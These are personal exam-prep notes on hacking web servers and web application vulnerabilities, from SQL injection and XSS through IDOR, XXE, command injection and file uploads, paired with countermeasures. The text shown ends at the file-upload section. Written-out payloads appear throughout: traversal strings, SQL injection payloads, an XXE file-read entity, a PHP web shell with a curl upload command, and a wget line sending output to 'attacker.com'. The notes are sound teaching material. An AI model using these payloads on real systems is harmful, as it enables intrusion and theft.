# Session 17A — Hacking Web Servers · Web App Vulnerabilities · Web-Based Password Cracking 🌐

> Personal study notes | Ethical Hacking Module | CCEE Prep

---

## 📑 Table of Contents

- [🗺️ Where This Session Fits](#️-where-this-session-fits)
- [⚠️ Exam Traps & Misconceptions](#️-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Hacking Web Servers](#section-1--hacking-web-servers)
  - [1.1 What Is a Web Server](#11-what-is-a-web-server)
  - [1.2 Why Web Servers Are Targeted](#12-why-web-servers-are-targeted)
  - [1.3 Web Server Attack Types](#13-web-server-attack-types)
  - [1.4 Directory Traversal Attack](#14-directory-traversal-attack)
  - [1.5 Web Server Misconfiguration Attacks](#15-web-server-misconfiguration-attacks)
  - [1.6 HTTP Response Splitting](#16-http-response-splitting)
  - [1.7 Web Cache Poisoning](#17-web-cache-poisoning)
  - [1.8 Web Server Countermeasures](#18-web-server-countermeasures)
- [Section 2 — Web Application Vulnerabilities](#section-2--web-application-vulnerabilities)
  - [2.1 OWASP Top 10 — Overview](#21-owasp-top-10--overview)
  - [2.2 SQL Injection](#22-sql-injection)
  - [2.3 Cross-Site Scripting (XSS)](#23-cross-site-scripting-xss)
  - [2.4 Broken Authentication](#24-broken-authentication)
  - [2.5 Insecure Direct Object Reference (IDOR)](#25-insecure-direct-object-reference-idor)
  - [2.6 Security Misconfiguration](#26-security-misconfiguration)
  - [2.7 Sensitive Data Exposure](#27-sensitive-data-exposure)
  - [2.8 XML External Entity (XXE)](#28-xml-external-entity-xxe)
  - [2.9 Command Injection](#29-command-injection)
  - [2.10 File Upload Vulnerabilities](#210-file-upload-vulnerabilities)
  - [2.11 Parameter Tampering](#211-parameter-tampering)
- [Section 3 — Web-Based Password Cracking Techniques](#section-3--web-based-password-cracking-techniques)
  - [3.1 Web Authentication Mechanisms](#31-web-authentication-mechanisms)
  - [3.2 Brute Force Attacks on Web Forms](#32-brute-force-attacks-on-web-forms)
  - [3.3 Dictionary Attacks](#33-dictionary-attacks)
  - [3.4 Credential Stuffing](#34-credential-stuffing)
  - [3.5 Password Spraying](#35-password-spraying)
  - [3.6 HTTP Basic and Digest Authentication Attacks](#36-http-basic-and-digest-authentication-attacks)
  - [3.7 Web Password Cracking Tools](#37-web-password-cracking-tools)
  - [3.8 Web Password Cracking Countermeasures](#38-web-password-cracking-countermeasures)
- [📌 Extra Notes](#-extra-notes)
  - [E1 — OWASP Top 10 Evolution](#e1--owasp-top-10-evolution)
  - [E2 — SQL Injection Deep Dive](#e2--sql-injection-deep-dive)
  - [E3 — HTTP Methods and Abuse](#e3--http-methods-and-abuse)
  - [E4 — Banner Grabbing and Web Server Fingerprinting](#e4--banner-grabbing-and-web-server-fingerprinting)
  - [E5 — Web Application Firewall (WAF)](#e5--web-application-firewall-waf)
  - [E6 — Famous Web Application Breaches](#e6--famous-web-application-breaches)
  - [E7 — Burp Suite for Web Application Testing](#e7--burp-suite-for-web-application-testing)
  - [E8 — Predecessor / Successor Chains](#e8--predecessor--successor-chains)
  - [E9 — Terminology Traps](#e9--terminology-traps)
  - [E10 — Current Landscape 2026](#e10--current-landscape-2026)
  - [E11 — Indian Legal Context](#e11--indian-legal-context)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

    Module 05 — Security Concepts
    └── Part B — Ethical Hacking (Sessions 6–20)
        ├── Sessions 6–9    : Concepts, Principles, Hacker Classes
        ├── Sessions 10–11  : Recon, Scanning, Enumeration, Passwords
        ├── Session 12A     : Password Countermeasures · Keyloggers
        ├── Session 12B     : Trojans · Backdoors · Reverse Shells
        ├── Session 13      : Trojan Construction · Wrapping · Evasion
        ├── Session 14      : Viruses · Worms · AV Evasion
        ├── Session 15      : Sniffing · ARP Poisoning · DNS Attacks
        ├── Session 16A     : DoS · DDoS · BOTs/BOTNETs · Smurf · SYN Flood
        ├── Session 16B     : Spoofing vs Hijacking · Session Hijacking
        ├── ▶ SESSION 17A   : Hacking Web Servers · Web App Vulnerabilities
        │                     Web-Based Password Cracking
        │                                          ← YOU ARE HERE
        ├── Session 17B     : Wireless Hacking · WEP/WPA · SSID/MAC Spoofing
        └── Sessions 18–20  : Backdoors · IDS · Physical Security · Malware RE

**Phase position:** Session 17A moves the attack surface from
network and session layers to the **web application layer** —
the most targeted attack surface in modern cybersecurity.
Web servers and applications are the public-facing entry points
to most organizations. Where Sessions 15–16 targeted the network
and transport layers, 17A targets what runs ON TOP of those layers:
HTTP, web applications, and web authentication.

The session hijacking knowledge from 16B directly applies here —
many web application vulnerabilities expose session tokens or
enable authentication bypass. SQL injection, XSS, and IDOR are
the three most commonly exploited web vulnerability classes
in real-world breaches.

---

## ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| SQL injection only affects login forms | SQL injection affects ANY input that is concatenated into a SQL query — search fields, URL parameters, HTTP headers, cookies, JSON fields. Login forms are just the most common example. |
| XSS attacks the server | XSS attacks the VICTIM'S BROWSER — the malicious script is injected into a page served by the web server but executes CLIENT-SIDE in the victim's browser. The server is the delivery mechanism, not the target. |
| Directory traversal and path traversal are different attacks | They are the SAME attack — also called dot-dot-slash attack. All three names refer to using `../` sequences to escape the web root and access files outside it. |
| IDOR is the same as privilege escalation | IDOR (Insecure Direct Object Reference) is about accessing OTHER USERS' objects by changing an identifier. Privilege escalation is about gaining HIGHER PRIVILEGES (e.g., user → admin). They can overlap but are distinct. |
| Credential stuffing is the same as brute force | Brute force tries random/all combinations of characters. Credential stuffing uses REAL STOLEN username/password pairs from previous breaches — much more effective because the passwords are real. |
| A WAF prevents all SQL injection | A WAF filters known attack patterns but can be bypassed with encoding, obfuscation, or novel injection syntax. WAFs are a defence-in-depth layer — not a complete substitute for parameterized queries. |
| HTTP Basic Authentication is secure because passwords are sent in headers | HTTP Basic Auth sends credentials in Base64-encoded headers — Base64 is NOT ENCRYPTION. Anyone who captures the header can decode the username and password trivially. It is only secure over HTTPS. |
| Parameter tampering only affects URL parameters | Parameter tampering can target URL parameters, POST body parameters, hidden HTML form fields, cookies, HTTP headers, and JSON/XML body fields — any value the client sends that the server trusts. |
| Web server version disclosure is low severity | Server version banners allow attackers to look up known vulnerabilities for that EXACT version — dramatically accelerating targeted exploitation. Version disclosure is a critical information leakage issue. |
| Password spraying and brute force have the same account lockout effect | Brute force tries MANY passwords against ONE account → triggers lockout. Password spraying tries ONE password against MANY accounts → never triggers per-account lockout because each account only sees one failed attempt. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**HTTP Request/Response Structure**

    HTTP Request:
    GET /login?user=admin HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0
    Cookie: SESSIONID=abc123
    Content-Type: application/x-www-form-urlencoded

    POST body (for POST requests):
    username=admin&password=secret

    HTTP Response:
    HTTP/1.1 200 OK
    Server: Apache/2.4.51 (Ubuntu)     ← version disclosure
    Content-Type: text/html
    Set-Cookie: SESSIONID=xyz789; HttpOnly; Secure

**HTTP Status Codes — Attack Relevant**

| Code | Meaning | Relevance |
|---|---|---|
| 200 | OK | Normal success |
| 301/302 | Redirect | Used in response splitting |
| 401 | Unauthorized | Auth required — login forced |
| 403 | Forbidden | Access denied — directory exists |
| 404 | Not Found | Resource does not exist |
| 500 | Internal Server Error | May indicate SQL injection success |
| 200 vs 403 | Access result | Used to confirm IDOR |

**SQL Basics — Prerequisite**

    Normal query:
    SELECT * FROM users WHERE username='admin' AND password='secret'

    Injection:
    username = admin' --
    Resulting query:
    SELECT * FROM users WHERE username='admin' --' AND password='anything'
    The -- comments out the rest → password check bypassed

**Web Server Software — Common Targets**

| Server | Platform | Default Port | Config File |
|---|---|---|---|
| Apache HTTP Server | Linux | 80/443 | httpd.conf, .htaccess |
| Nginx | Linux | 80/443 | nginx.conf |
| Microsoft IIS | Windows | 80/443 | web.config |
| Tomcat | Java | 8080 | server.xml |

**MITRE ATT&CK Reference**

- T1190 — Exploit Public-Facing Application
- T1059.007 — Command and Scripting: JavaScript
- T1110 — Brute Force
- T1110.001 — Password Guessing
- T1110.003 — Password Spraying
- T1110.004 — Credential Stuffing
- T1505.003 — Server Software Component: Web Shell
- T1134 — Access Token Manipulation

</details>

---

## Section 1 — Hacking Web Servers

### 1.1 What Is a Web Server

**WHAT:**
A web server is software (and the hardware it runs on) that accepts
HTTP/HTTPS requests from clients and returns HTTP responses —
typically HTML pages, API responses, images, or files.

**Key web server software:**

| Server | Market Share | Common Use |
|---|---|---|
| **Apache HTTP Server** | ~25% | Linux — open source — flexible |
| **Nginx** | ~34% | High performance — reverse proxy — CDN |
| **Microsoft IIS** | ~9% | Windows Server — .NET applications |
| **Apache Tomcat** | ~4% | Java web applications (JSP/Servlets) |
| **LiteSpeed** | ~12% | Performance-focused — cPanel hosting |

**Web server components that are attacked:**

    Web Server
    ├── Server software (Apache, Nginx, IIS)
    ├── Operating system underneath
    ├── Web application (PHP, Python, Node.js, Java)
    ├── Database (MySQL, PostgreSQL, MSSQL)
    ├── Third-party modules and plugins
    └── Configuration files and permissions

---

### 1.2 Why Web Servers Are Targeted

| Reason | Detail |
|---|---|
| **Public exposure** | Web servers listen on port 80/443 — accessible from the entire internet |
| **Data storage** | Web apps connect to databases containing user data, financial records, credentials |
| **Gateway to internal network** | Compromised web server can pivot into internal infrastructure |
| **Trust relationship** | Users trust the web server — XSS and CSRF exploit this trust |
| **Complex attack surface** | Web apps have hundreds of input fields, parameters, and endpoints |
| **Legacy code** | Many applications contain years of accumulated technical debt |
| **Third-party components** | Frameworks, libraries, plugins with known vulnerabilities |

---

### 1.3 Web Server Attack Types

| Attack Category | Description | Example |
|---|---|---|
| **Misconfiguration** | Default settings, unnecessary services, open directories | Default IIS page, directory listing |
| **Operating system vulnerabilities** | Unpatched OS under the web server | MS17-010 (EternalBlue) on IIS host |
| **Application vulnerabilities** | Bugs in web application code | SQL injection, XSS, IDOR |
| **Directory traversal** | Escape web root to access OS files | `../../../../etc/passwd` |
| **HTTP response splitting** | Inject newlines into HTTP response headers | Cache poisoning, XSS |
| **Web cache poisoning** | Poison CDN/proxy cache with malicious content | Stored XSS via cached response |
| **Denial of Service** | Slow HTTP attacks (Slowloris), HTTP floods | Apache thread exhaustion |
| **Banner grabbing** | Identify server version → target known CVEs | `telnet host 80` → Server: Apache/2.2.15 |
| **Web shell upload** | Upload malicious script → remote code execution | `.php` webshell via file upload |
| **Password brute force** | Automate login attempts against web forms | Hydra against admin panel |

---

### 1.4 Directory Traversal Attack

**WHAT:**
Directory traversal (also called path traversal or dot-dot-slash
attack) is an attack that uses `../` sequences in URL parameters or
file path inputs to **navigate outside the intended web root
directory** and access arbitrary files on the operating system.

**WHY it works:**
Web applications sometimes include files based on user-controlled
input without properly sanitizing path separators. The `../`
sequence means "go up one directory" in Unix/Windows path
resolution.

**HOW:**

    Normal web application file inclusion:
    https://example.com/view?file=report.pdf
    Server reads: /var/www/html/uploads/report.pdf

    Directory traversal attack:
    https://example.com/view?file=../../../../etc/passwd
    Server reads: /var/www/html/uploads/../../../../etc/passwd
                = /etc/passwd  (Unix password file)

    Windows equivalent:
    https://example.com/view?file=..\..\..\..\windows\system32\drivers\etc\hosts

**Common target files:**

| File | OS | Contents |
|---|---|---|
| `/etc/passwd` | Linux | User account list |
| `/etc/shadow` | Linux | Hashed passwords (requires root) |
| `/etc/hosts` | Linux | Local hostname mappings |
| `C:\Windows\win.ini` | Windows | Legacy Windows config |
| `C:\Windows\System32\drivers\etc\hosts` | Windows | Host mappings |
| `/var/log/apache2/access.log` | Linux | Web server access log |
| `../config/database.php` | Linux | Database credentials |

**Encoding bypass techniques:**
Filters that block `../` can often be bypassed:

    URL encoding:        %2e%2e%2f  =  ../
    Double URL encoding: %252e%252e%252f
    Unicode encoding:    ..%c0%af   (Unicode slash)
    Mixed encoding:      ..%2f
    Null byte:           ../../../etc/passwd%00.jpg
                         (null byte truncates .jpg extension)

> [!IMPORTANT]
> The null byte injection (`%00`) trick works on older PHP versions
> (< 5.3.4) where `include(user_input + ".php")` can be tricked into
> reading a different file by null-terminating before the `.php`.
> Modern PHP versions are patched against this.

**Countermeasures:**

| Control | Implementation |
|---|---|
| Input validation | Reject any input containing `../`, `..\\`, URL-encoded equivalents |
| Canonicalize paths | Resolve to absolute path — verify it starts with expected web root |
| Chroot jail | Web server runs in chroot — cannot access files outside jail |
| OS permissions | Web server user has read access ONLY to web root directories |
| Web Application Firewall | Filter `../` sequences in all request parameters |

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

### 1.5 Web Server Misconfiguration Attacks

**WHAT:**
Web server misconfiguration attacks exploit **insecure default
settings, unnecessary enabled features, and improper permissions**
on web server installations.

**Common misconfigurations and their exploitation:**

**Directory Listing (Index browsing):**

    Misconfiguration: Apache Options +Indexes enabled
    Effect: When no index.html exists, server lists all files in directory
    URL:    https://example.com/uploads/
    Attacker sees: list of all uploaded files → download sensitive documents

    Fix: Apache: Options -Indexes
         Nginx:   autoindex off;

**Default credentials:**

    IIS default installation: no default page but default admin
    Tomcat Manager: admin/admin, tomcat/tomcat (default)
    phpMyAdmin: root with blank password (misconfigured)
    Attack: Access admin panel → deploy webshell → RCE

**Unnecessary HTTP methods:**

    Methods that should often be disabled:
    PUT    → upload arbitrary files to web server
    DELETE → delete files on web server
    TRACE  → reflects request back → Cross-Site Tracing (XST) attack
    OPTIONS → reveals all supported methods (reconnaissance)

    Test: curl -X OPTIONS https://example.com -v
    If PUT is enabled: curl -X PUT https://example.com/shell.php -d "<?php system($_GET['cmd']); ?>"

**Server version disclosure:**

    Response header: Server: Apache/2.4.49 (Ubuntu)
    Attack: Search NVD/Exploit-DB for Apache 2.4.49 vulnerabilities
    CVE-2021-41773: Path traversal + RCE in Apache 2.4.49 specifically
    → Attacker has exact version → targets known CVE immediately

    Fix: Apache:  ServerTokens Prod (shows only "Apache")
                  ServerSignature Off
         Nginx:   server_tokens off;
         IIS:     Remove X-Powered-By header

**Sample .htaccess / robots.txt exposure:**

    robots.txt reveals hidden directories:
    User-agent: *
    Disallow: /admin/
    Disallow: /backup/
    Disallow: /config/

    Attacker reads robots.txt → visits /admin/ and /backup/
    Finds database backup or unprotected admin panel

---

### 1.6 HTTP Response Splitting

**WHAT:**
HTTP Response Splitting is an attack that injects **CRLF sequences
(carriage return `\r` + line feed `\n`)** into HTTP response headers
through user-controlled input — allowing the attacker to inject
additional HTTP headers or split a single response into two separate
responses.

**WHY it works:**
HTTP headers are separated from each other and from the body using
CRLF sequences. If user input is reflected in a response header
without sanitization, injecting CRLF allows inserting arbitrary
header content.

**HOW:**

    Vulnerable redirect:
    Location: https://example.com/redirect?url=https://trusted.com

    Attacker input:
    url=https://trusted.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK...

    %0d = \r (carriage return)
    %0a = \n (line feed)

    Resulting response headers:
    HTTP/1.1 302 Found
    Location: https://trusted.com
    Content-Length: 0

    HTTP/1.1 200 OK         ← Second injected response
    Content-Type: text/html
    [Attacker-controlled content]

**Consequences:**
- Cache poisoning (inject malicious response that gets cached)
- XSS via injected script in second response
- Session fixation via injected Set-Cookie header
- Content injection (deface cached pages)

**Countermeasure:**
Sanitize all user input before including in HTTP response headers.
Remove or encode `\r`, `\n`, `%0d`, `%0a` from any value that
appears in response headers.

---

### 1.7 Web Cache Poisoning

**WHAT:**
Web cache poisoning is an attack where the attacker causes a
**web cache (CDN, reverse proxy, or browser cache)** to store a
malicious response — which is then served to all subsequent users
who request the same cached resource.

**HOW:**

    Cache key components: URL + Host header (typically)
    Unkeyed inputs: X-Forwarded-Host, X-Forwarded-For (often cached without being in cache key)

    Attacker sends:
    GET / HTTP/1.1
    Host: example.com
    X-Forwarded-Host: attacker.com   ← unkeyed header

    Vulnerable server reflects X-Forwarded-Host in response:
    <script src="https://attacker.com/analytics.js"></script>

    Cache stores this response keyed to: GET / Host: example.com
    All subsequent users requesting / receive attacker's response
    Their browsers load script from attacker.com → XSS

**Countermeasures:**
- Do not reflect unkeyed request headers in responses
- Include all security-relevant headers in cache keys
- Use cache-control headers properly
- CDN configuration review

---

### 1.8 Web Server Countermeasures

| Control | Implementation |
|---|---|
| **Patch management** | Apply OS and web server patches regularly — web server CVEs are actively exploited |
| **Disable directory listing** | `Options -Indexes` (Apache) / `autoindex off` (Nginx) |
| **Remove default content** | Delete default pages, sample scripts, test files after installation |
| **Restrict HTTP methods** | Disable PUT, DELETE, TRACE unless specifically required |
| **Hide server version** | `ServerTokens Prod` (Apache) / `server_tokens off` (Nginx) |
| **Web Application Firewall (WAF)** | ModSecurity (Apache), Nginx WAF, cloud WAF (Cloudflare, AWS WAF) |
| **TLS configuration** | Disable SSLv3, TLSv1.0/1.1 — use TLS 1.2+ with strong ciphers |
| **Principle of least privilege** | Web server process runs as low-privilege user (www-data) |
| **Chroot / containerization** | Isolate web server from rest of OS filesystem |
| **Log monitoring** | Alert on 400/500 errors, directory traversal patterns, repeated failures |
| **File permissions** | Web root files: 644 (files), 755 (directories) — not 777 |
| **Remove robots.txt sensitive paths** | Do not advertise sensitive directories in robots.txt |

---

## Section 2 — Web Application Vulnerabilities

### 2.1 OWASP Top 10 — Overview

**WHAT:**
OWASP (Open Web Application Security Project) publishes the
**OWASP Top 10** — a regularly updated list of the most critical
web application security risks, based on data from real-world
vulnerabilities, exploits, and industry surveys.

**OWASP Top 10 (2021 — current for exam):**

| Rank | Category | Key Vulnerability |
|---|---|---|
| A01 | Broken Access Control | IDOR, privilege escalation, path traversal |
| A02 | Cryptographic Failures | Sensitive data in cleartext, weak encryption, MD5 |
| A03 | Injection | SQL injection, command injection, XXE, LDAP injection |
| A04 | Insecure Design | Missing threat modeling, insecure design patterns |
| A05 | Security Misconfiguration | Default creds, open directories, verbose errors |
| A06 | Vulnerable and Outdated Components | Unpatched libraries, old frameworks |
| A07 | Identification and Authentication Failures | Broken auth, weak passwords, no MFA |
| A08 | Software and Data Integrity Failures | Insecure CI/CD, unsigned updates |
| A09 | Security Logging and Monitoring Failures | Missing logs, no alerting |
| A10 | Server-Side Request Forgery (SSRF) | Server fetches attacker-controlled URL |

> [!NOTE]
> The **2017 OWASP Top 10** is also referenced in many exam materials:
> SQL Injection was A1, XSS was A7, Broken Authentication was A2.
> Know both 2017 and 2021 versions — exam questions may reference either.

---

### 2.2 SQL Injection

**WHAT:**
SQL Injection (SQLi) is a vulnerability where **user-supplied input
is incorporated into SQL queries without proper sanitization** —
allowing an attacker to modify the intended SQL logic, extract data,
bypass authentication, or execute OS commands.

**WHY it works:**

    Vulnerable PHP code:
    $query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";

    Normal input:  user=admin
    Query: SELECT * FROM users WHERE username='admin'

    Malicious input: user=admin' OR '1'='1
    Query: SELECT * FROM users WHERE username='admin' OR '1'='1'
    Result: Returns ALL users (1=1 always true) → authentication bypassed

**SQL Injection Types:**

| Type | Mechanism | Output |
|---|---|---|
| **Classic / In-band** | Results returned in HTTP response | Direct data extraction |
| **Error-based** | Force database errors that reveal schema info | DB structure via error messages |
| **Union-based** | Append UNION SELECT to query — returns extra data | Extract any table data |
| **Blind (Boolean)** | Ask true/false questions — infer data from response | Slow — one bit per request |
| **Blind (Time-based)** | Use SLEEP() or WAITFOR — infer from response delay | No visible output needed |
| **Out-of-band** | Extract data via DNS or HTTP requests from DB server | Bypass output restrictions |
| **Stored** | SQLi payload stored in DB → executed later | Persistent — affects all future queries |

**Common SQLi payloads:**

    Authentication bypass:
    ' OR '1'='1' --
    ' OR 1=1 --
    admin'--
    ' OR 'x'='x

    Extract database version:
    ' UNION SELECT version(),null,null --   (MySQL)
    ' UNION SELECT @@version,null,null --   (MSSQL)

    Extract table names:
    ' UNION SELECT table_name,null FROM information_schema.tables --

    Time-based blind:
    '; IF (1=1) WAITFOR DELAY '0:0:5' --    (MSSQL)
    ' OR SLEEP(5) --                         (MySQL)

**Prevention:**

| Method | Implementation | Effectiveness |
|---|---|---|
| **Parameterized queries (prepared statements)** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id])` | ✅ Primary fix — eliminates SQLi |
| **Stored procedures** | Pre-compiled SQL — parameters cannot alter structure | ✅ Effective |
| **Input validation** | Whitelist allowed characters — reject unexpected input | ⚠️ Secondary — can be bypassed |
| **Least privilege DB user** | Web app DB user has SELECT only — cannot DROP | Limits damage |
| **WAF** | Filter known SQLi patterns | ⚠️ Bypass possible |
| **Error handling** | Generic error messages — don't expose DB errors | Limits information |

> [!IMPORTANT]
> **Parameterized queries (prepared statements)** are the ONLY
> complete solution to SQL injection. Input validation and WAFs
> are supplementary. The key principle: user data NEVER becomes
> part of the SQL command structure — it is always treated as
> a data value, never as SQL syntax.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

### 2.3 Cross-Site Scripting (XSS)

Covered in detail in Session 16B (Section 6.2).
Key recap for this session:

**Three types:**

| Type | Storage | Trigger | Impact |
|---|---|---|---|
| **Reflected** | URL parameter | Victim clicks crafted link | Single victim |
| **Stored** | Database | Any visitor loads page | All visitors |
| **DOM** | Client-side JS | URL fragment processing | No server involvement |

**XSS beyond session hijacking — in web server context:**

    Defacement: attacker stores script that replaces page content
    Keylogging: document.addEventListener('keypress', ...) → capture all keystrokes
    Phishing overlay: inject fake login form over legitimate page
    Drive-by download: redirect victim to malware download
    Port scanning: use victim's browser to scan internal network via fetch()
    CSRF amplification: XSS enables CSRF attacks (can read CSRF tokens)

**Content Security Policy (CSP) — Primary XSS Defence:**

    HTTP Response Header:
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

    This prevents execution of inline scripts and scripts from
    unauthorised origins — significantly limits XSS impact.

**MITRE ATT&CK:** T1059.007 — JavaScript

---

### 2.4 Broken Authentication

**WHAT:**
Broken Authentication encompasses vulnerabilities that allow
attackers to **compromise passwords, keys, session tokens, or
exploit flaws in authentication implementation** to assume other
users' identities.

**Common broken authentication vulnerabilities:**

| Vulnerability | Description | Impact |
|---|---|---|
| **Weak passwords allowed** | No password complexity requirements | Easy brute force |
| **No account lockout** | Unlimited login attempts permitted | Brute force practical |
| **Credential exposure in URL** | Password sent as GET parameter → logs, history | Credential theft |
| **Insecure password reset** | Predictable tokens, no expiry, SMS-based bypass | Account takeover |
| **"Remember me" forever** | Persistent session never expires | Stolen device = account takeover |
| **Hardcoded credentials** | admin/admin, test/test in production | Trivial access |
| **Plain text password storage** | Passwords in DB as cleartext | DB breach = all passwords stolen |
| **Weak hashing** | MD5 or SHA-1 without salt | Rainbow table attack |
| **No MFA for sensitive ops** | Single factor only | Compromised password = compromised account |

**OWASP 2021:** A07 — Identification and Authentication Failures

---

### 2.5 Insecure Direct Object Reference (IDOR)

**WHAT:**
IDOR occurs when an application uses a **user-controllable
identifier** (ID, filename, key) to directly access an object
(database record, file, function) **without verifying that the
requesting user is authorized to access that specific object**.

**HOW:**

    Normal request (victim):
    GET /api/invoice/1234 HTTP/1.1
    Cookie: SESSIONID=victim_session
    → Returns invoice #1234 (victim's invoice)

    IDOR attack (attacker changes ID):
    GET /api/invoice/1235 HTTP/1.1
    Cookie: SESSIONID=attacker_session
    → Returns invoice #1235 (ANOTHER USER'S invoice)
    → Attacker can enumerate: /invoice/1, /invoice/2, /invoice/3...

**Other IDOR examples:**

    File access:  GET /download?file=user_1234_statement.pdf
    Modified to:  GET /download?file=user_9999_statement.pdf

    User profile: PUT /api/user/456/email  (attacker changes another user's email)

    Order access: GET /orders/789  (attacker views another user's order)

**Why it's OWASP A01 (Broken Access Control):**
IDOR is the most commonly found access control vulnerability.
Applications frequently implement authentication (proving who you are)
but fail to implement proper authorization (verifying what you are
allowed to access for each specific object).

**Prevention:**

    1. Server-side authorization check on EVERY object access:
       if (invoice.owner_id != current_user.id) { return 403; }

    2. Use indirect references (maps):
       User's session maps "REF-001" → actual DB id 1234
       User cannot guess other mappings

    3. Use random UUIDs instead of sequential integers:
       /invoice/550e8400-e29b-41d4-a716-446655440000
       Hard to enumerate — but NOT a substitute for authorization checks

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

### 2.6 Security Misconfiguration

Covered in Section 1.5 (Web Server Misconfiguration).
Additional application-level misconfigurations:

| Misconfiguration | Example | Fix |
|---|---|---|
| **Verbose error messages** | Stack trace with file paths exposed to user | Generic error messages in production |
| **Debug mode in production** | Django DEBUG=True exposes full config | Always False in production |
| **Default admin paths** | /admin, /phpmyadmin, /wp-admin left at default | Move, restrict by IP, or rename |
| **Unnecessary features enabled** | Unused endpoints, test pages, debug APIs | Remove or disable unused functionality |
| **Overly permissive CORS** | Access-Control-Allow-Origin: * | Restrict to specific trusted origins |
| **Insecure HTTP headers missing** | No X-Frame-Options, no CSP, no HSTS | Add all security headers |

**OWASP 2021:** A05 — Security Misconfiguration

---

### 2.7 Sensitive Data Exposure

**WHAT:**
Sensitive data exposure occurs when applications **fail to adequately
protect sensitive information** — such as credentials, financial data,
health records, or PII — during storage or transmission.

| Exposure Type | Cause | Example |
|---|---|---|
| **Cleartext transmission** | HTTP instead of HTTPS | Credentials interceptable by sniffer |
| **Weak encryption** | MD5, SHA-1, DES, RC4 | Hash cracking, decryption |
| **No encryption at rest** | Database stores plaintext passwords | DB breach = immediate credential exposure |
| **Hardcoded secrets** | API keys, passwords in source code | Git repo exposure |
| **Excessive data in responses** | API returns full user object including sensitive fields | Data minimization violation |
| **Caching of sensitive data** | `Cache-Control` not set — browser caches sensitive pages | Shared computer exposure |

**OWASP 2021:** A02 — Cryptographic Failures

---

### 2.8 XML External Entity (XXE)

**WHAT:**
XXE is a vulnerability in **XML parsers** that allows an attacker to
define an external entity in XML input that references a local file
or remote URL — causing the XML parser to include its contents in
the parsed output.

**HOW:**

    Vulnerable application accepts XML:
    POST /api/parse HTTP/1.1
    Content-Type: application/xml

    Normal XML:
    <?xml version="1.0"?>
    <data><name>John</name></data>

    XXE payload:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data><name>&xxe;</name></data>

    Server parses XML → external entity resolved → /etc/passwd content
    Server returns response containing /etc/passwd contents

**XXE Impact:**
- Local file disclosure (`file:///etc/passwd`, `file:///etc/shadow`)
- Server-Side Request Forgery (SSRF) via `http://internal-server/`)
- Remote code execution (in some parsers/configurations)
- Denial of service (Billion Laughs attack — entity expansion bomb)

**Billion Laughs (XML DoS):**

    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      ...
    ]>
    <root>&lol9;</root>    <!-- expands to billions of "lol" strings -->

**Prevention:**
- Disable external entity processing in XML parser configuration
- Use JSON instead of XML where possible
- Patch XML parser libraries

**OWASP 2021:** A03 — Injection (includes XXE)

---

### 2.9 Command Injection

**WHAT:**
Command injection occurs when **user-supplied input is passed to
a shell command without sanitization** — allowing the attacker to
execute arbitrary OS commands on the web server.

**HOW:**

    Vulnerable PHP code using system():
    $output = system("ping -c 1 " . $_GET['host']);

    Normal use:  host=8.8.8.8
    Command:     ping -c 1 8.8.8.8  → normal ping output

    Injection:   host=8.8.8.8; cat /etc/passwd
    Command:     ping -c 1 8.8.8.8; cat /etc/passwd
    → Ping runs → then cat /etc/passwd runs → password file returned

    Command chaining operators:
    ;     → run second command regardless (Unix)
    &&    → run second command only if first succeeds
    ||    → run second command only if first fails
    |     → pipe output of first to second
    `cmd` → backtick execution (Unix)
    $(cmd)→ command substitution

**Blind command injection:**
If output is not displayed:

    host=8.8.8.8; sleep 5      → if response delayed 5s → injection confirmed
    host=8.8.8.8; wget http://attacker.com/$(whoami)
    → Server makes HTTP request revealing command output in attacker's logs

**Prevention:**
- Never pass user input to shell functions (system, exec, popen)
- Use language-native libraries instead of shell commands
- Whitelist input — only allow known safe characters
- Run web application with minimal OS privileges

**MITRE ATT&CK:** T1059 — Command and Scripting Interpreter

---

### 2.10 File Upload Vulnerabilities

**WHAT:**
File upload vulnerabilities occur when a web application **accepts
file uploads without sufficient validation** — allowing an attacker
to upload a malicious file (typically a web shell) that can be
executed by the web server.

**Attack scenario:**

    Vulnerable file upload — only checks file extension:
    Application allows: .jpg, .png, .gif

    Attacker uploads: shell.php renamed to shell.jpg
    → Extension check passes (ends in .jpg)
    → File stored as shell.jpg on server
    → Attacker accesses: https://example.com/uploads/shell.jpg
    → Web server may execute as PHP depending on config

    PHP web shell content:
    <?php system($_GET['cmd']); ?>

    Usage: https://example.com/uploads/shell.php?cmd=id
    Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

**Bypass techniques:**

| Bypass | Method |
|---|---|
| **Double extension** | `shell.php.jpg` — server may execute .php |
| **MIME type spoofing** | Send `Content-Type: image/jpeg` with PHP content |
| **Null byte** | `shell.php%00.jpg` — older PHP truncates at null byte |
| **Uppercase extension** | `shell.PHP` — case-insensitive check bypass |
| **Alternative PHP extensions** | `.php3`, `.php4`, `.php5`, `.phtml`, `.pht` |

**Prevention:**

| Control | Detail |
|---|---|
| Validate file type by magic bytes | Check first bytes of file — not just extension |
| Store uploads outside web root | Files not accessible via HTTP directly |
| Rename uploaded files | Random filename — attacker cannot guess path |
| Restrict execution permissions | Upload directory has no execute permission |
| Antivirus scanning | Scan uploaded files before storing |
